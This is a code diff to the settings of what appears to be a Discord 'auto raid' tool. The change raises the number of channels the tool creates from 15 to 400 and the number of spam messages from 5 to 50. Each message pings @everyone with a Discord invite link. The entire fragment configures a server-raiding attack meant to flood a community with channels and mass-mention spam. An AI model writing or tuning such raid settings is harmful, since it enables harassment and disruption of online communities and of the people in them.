@@ -23,10 +23,10 @@ WEBHOOK_CONFIG = {
 
 
 AUTO_RAID_CONFIG = {
-    'num_channels': 15,  # Number of channels
+    'num_channels': 400,  # Number of channels
     'channel_type': 'text',  # text/voice
     'channel_name': 'kol sid here',  # Channel name
-    'num_messages': 5,  # Number of message to spam
+    'num_messages': 50,  # Number of message to spam
     'message_content': '@everyone https://discord.gg/M4nWG6d3YN' # Spam Message
 }
 
